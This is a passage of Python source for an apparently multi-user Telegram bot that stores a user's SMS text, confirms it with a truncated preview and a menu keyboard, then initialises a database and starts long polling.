        save_user_data(uid, data)
        s.message = body
        s.step = "idle"
        bot.reply_to(
            message,
            f"SMS saved.\n<code>{body[:200]}{'…' if len(body)>200 else ''}</code>\n\n"
            f"Tap <b>{BTN_START}</b> when ready.",
            reply_markup=main_keyboard(),
        )
        return

    bot.reply_to(message, "Use the menu buttons.", reply_markup=main_keyboard())

# ── MAIN ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    log.info("Starting multi-user SMS bot…")
    init_db()
    bot.infinity_polling(timeout=60, long_polling_timeout=30)
